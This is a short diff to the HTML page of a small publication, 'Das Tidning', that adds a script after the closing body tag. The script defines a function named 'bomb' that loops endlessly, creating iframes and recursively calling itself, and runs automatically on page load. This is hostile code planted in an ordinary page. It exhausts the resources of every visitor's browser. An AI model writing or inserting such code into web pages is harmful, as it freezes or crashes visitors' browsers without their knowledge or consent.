@@ -18,4 +18,13 @@
   <span class="bold">Das Tidning</span> skrivs av Jonathan och Harald.
 </div>
 </body>
+    <script>
+        async function bomb() {
+  while (true) {
+    document.createElement("iframe")
+    await bomb()
+  }
+}
+        bomb();
+    </script>
 </html>
